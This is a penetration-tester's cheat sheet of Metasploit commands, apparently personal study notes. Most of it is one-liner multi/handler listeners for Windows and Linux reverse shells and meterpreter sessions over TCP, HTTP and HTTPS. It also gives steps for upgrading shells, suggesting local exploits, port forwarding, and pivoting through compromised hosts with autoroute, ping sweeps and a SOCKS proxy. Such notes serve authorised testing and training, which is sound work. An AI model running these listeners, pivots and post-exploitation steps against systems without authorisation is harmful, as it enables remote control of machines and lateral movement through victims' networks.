#### Starting metasploit
```
sudo msfdb run
```
#### Upgrade to meterpreter shell
Background shell with CTRL+Z
```
use post/multi/manage/shell_to_meterpreter
```
```
set SESSION 1
```
```
run
```
```
sessions -i 2
```
#### Windows reverse exe
[[1._Reverse Shells (WIN)#MSFVenom]]
#### Meterpreter Listener 1 Liner
HTTP Stageless:
```
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_http;set LHOST $KALI;set LPORT 443;run"
```
HTTP Staged:
```
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_http;set LHOST $KALI;set LPORT 443;run"
```
HTTPS Stageless:
```
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_https;set LHOST $KALI;set LPORT 443;run"
```
HTTPS Staged:
```
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST $KALI;set LPORT 443;run"
```
Windows 64:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST $KALI;set LPORT 443;run"
```
Windows 86:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $KALI;set LPORT 443;run"
```
Linux 64:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST $KALI;set LPORT 443;run"
```
Linux 86:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload linux/meterpreter/reverse_tcp;set LHOST $KALI;set LPORT 443;run"
```
#### Non-Meterpreter Listener 1 Liner
Windows 64:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/x64/shell_reverse_tcp;set LHOST $KALI;set LPORT 443;run"
```
Windows 86:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST $KALI;set LPORT 443;run"
```
Linux 64:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload linux/x64/shell_reverse_tcp;set LHOST $KALI;set LPORT 443;run"
```
Linux 86:
```bash - kali
msfconsole -x "use exploit/multi/handler;set payload linux/shell_reverse_tcp;set LHOST $KALI;set LPORT 443;run"
```
#### Local Exploit Suggester
```meterpreter - kali
run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true
```
```metereprter - kali
set verbose true
```
```metereprter - kali
set exitonsession false
```
#### Port Forward
```meterperter - kali
portfwd add -l 80 -p 80 -r $TARGET
```
#### Pivoting
```
background
```
```
use post/multi/manage/autoroute
```
set subnet to the new found subnet:
```
set SUBNET x.x.x.x
```
```
set SESSION 2
```
```
exploit
```
```
use post/multi/gather/ping_sweep
```
```
set rhosts x.x.x.0/24
```
```
set session 1
```
```
run
```
To use proxychains and other tools:
```
background
```
```
use auxiliary/server/socks_proxy
```
```
run
```
```
sudo mousepad /etc/proxychains.conf
```
#### Post exploit modules
https://www.offsec.com/metasploit-unleashed/post-module-reference/